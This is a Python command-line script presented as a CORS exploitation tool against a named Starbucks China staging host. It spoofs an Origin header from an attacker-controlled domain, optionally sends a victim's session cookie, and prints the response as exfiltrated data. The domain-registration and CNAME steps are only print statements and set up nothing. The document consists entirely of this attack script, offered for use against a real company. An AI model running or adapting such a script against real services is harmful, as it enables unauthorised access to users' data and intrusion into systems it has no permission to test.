import requests
import time
import argparse

def register_free_domain(domain):
    print(f"[+] Using free domain: {domain}")
    return domain

def setup_cname(domain):
    print(f"[+] Setting up CNAME for {domain} to match Starbucks' vulnerable pattern...")
    attacker_subdomain = f"d3v.{domain}"
    print(f"[+] CNAME {attacker_subdomain} → d3vams-public-staging-sbux.starbucks.com.cn")
    return attacker_subdomain

def exploit_cors(target, attacker_domain, cookie):
    print(f"[+] Attempting CORS Exploitation from {attacker_domain}...")

    headers = {
        "Origin": f"https://{attacker_domain}"
    }

    cookies = {
        "session": cookie
    } if cookie else {}

    response = requests.get(target, headers=headers, cookies=cookies)

    if response.status_code == 200:
        print("[✔] Data Exfiltrated Successfully:\n", response.text)
    else:
        print(f"[X] Exploit Failed! Response Code: {response.status_code}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CLI-Based CORS Exploitation Tool")
    parser.add_argument("-d", "--domain", required=True, help="Attacker-controlled free domain")
    parser.add_argument("-t", "--target", required=True, help="Target URL to exploit")
    parser.add_argument("-c", "--cookie", required=False, help="Session cookie (optional)")

    args = parser.parse_args()

    free_domain = register_free_domain(args.domain)
    attacker_subdomain = setup_cname(free_domain)

    print("\n[+] Waiting for DNS Propagation (60 sec)...")
    time.sleep(60)

    exploit_cors(args.target, attacker_subdomain, args.cookie)
